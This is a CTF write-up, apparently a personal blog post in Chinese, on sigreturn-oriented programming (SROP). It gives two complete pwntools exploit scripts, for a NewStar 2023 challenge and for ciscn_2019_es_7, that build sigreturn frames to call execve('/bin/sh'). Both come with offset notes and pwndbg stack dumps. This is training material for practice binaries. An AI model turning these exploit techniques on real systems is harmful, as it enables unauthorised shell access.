---
title: SROP
tags: [ctf-pwn,stack]
date: 2023-11-27 14:44:00
categories: [ctf-pwn]
excerpt: exp
---

需要syscall ret，如果没有syscall 15，就要先造一个  pop rax, ret 加 0xf 的gadget，然后在执行syscall。



### Newstar2023 srop

<https://buuoj.cn/match/matches/190/challenges>

整体思路就是先构造一个syscall 15的rop，然后在这个syscall栈下面放上一个frame，frame的rip指向syscall，然后再把需要执行的函数和参数写进其他寄存器

0xf是sigreturn调用号，59是execve调用号

不懂为什么syscall的调用号是在rdi上

> 答：这道题是call syscall ，不是直接执行syscall
>
> \_\_int64 syscall(__int64 sysno, ...)
> {
>   	return syscall(sysno);
> }

第一次send栈迁移是为了能够知道/bin/sh在哪，在原本的栈上不知道地址



```python
from pwn import *

context.arch='amd64'
context.os='linux'
context.log_level='debug'

p=process('./pwn_1')
elf=ELF('./pwn_1')

rdi=0x401203
syscall=elf.plt['syscall']
lea=0x401171
bss=0x404050+0x300 # 这个0x300换成别的或者直接不加，试过也可以

p.recvuntil('welcome to srop!\n')
frame=SigreturnFrame()
frame.rdi=59
frame.rsi=bss-0x30 # 原本的栈上rbp距离字符串开头是0x30字节，栈迁移过来也一样
frame.rdx=0
frame.rcx=0
frame.rsp=bss+0x38
frame.rip=syscall

p.send(b'a'*0x30+flat(bss,lea))
p.send(b'/bin/sh\x00'+b'a'*0x30+flat(rdi,0xf,syscall,frame))

p.interactive()

```

### ciscn_2019_es_7

<https://buuoj.cn/challenges#ciscn_2019_es_7>

sys_write本身泄露了栈上的地址，计算和buf输入的binsh的偏移

```python
from pwn import *
from LibcSearcher import *
#context.arch='amd64'
context(os='linux',arch='amd64',log_level='debug')

#p=process("./ciscn_2019_es_7")
p=remote('node4.buuoj.cn',25797)

syscall_ret=0x400517
sigreturn_addr=0x4004da # rax = 15, ret
system_addr=0x4004E2	# syscall, ret

rax=0x4004f1

p.send(b"/bin/sh"+b"\x00"*9+p64(rax))
p.recv(32)
stack_addr=u64(p.recv(8))
log.success("stack: "+hex(stack_addr))
p.recv(8)

sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = stack_addr - 0x118  
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

p.send(b"/bin/sh"+b"\x00"*(0x1+0x8)+p64(sigreturn_addr)+p64(syscall_ret)+bytes(sigframe))

p.interactive()
```

上面的exp里binsh和泄露的地址偏移是0x118，但是在我本地是328（kali2023.3），远程是ubuntu18

```python
pwndbg> x/100x 0x7fffffffde00 -40
0x7fffffffddd8: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdde8: 0x00000000      0x00000000      0x31333231      0x32313332 #  ddf0是buf的地址
0x7fffffffddf8: 0x00000a33      0x00000000      0xffffde20      0x00007fff
0x7fffffffde08: 0x00400536      0x00000000      0xffffdf38      0x00007fff
0x7fffffffde18: 0x00000000      0x00000001      0x00000001      0x00000000
pwndbg> stack 30
00:0000│ rbp rsp 0x7fffffffde00 —▸ 0x7fffffffde20 ◂— 0x1
01:0008│         0x7fffffffde08 —▸ 0x400536 (main+25) ◂— nop  # ret addr
02:0010│         0x7fffffffde10 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2af ◂— '/home/kali/Desktop/ciscn_s_3'
03:0018│         0x7fffffffde18 ◂— 0x100000000
04:0020│         0x7fffffffde20 ◂— 0x1

```

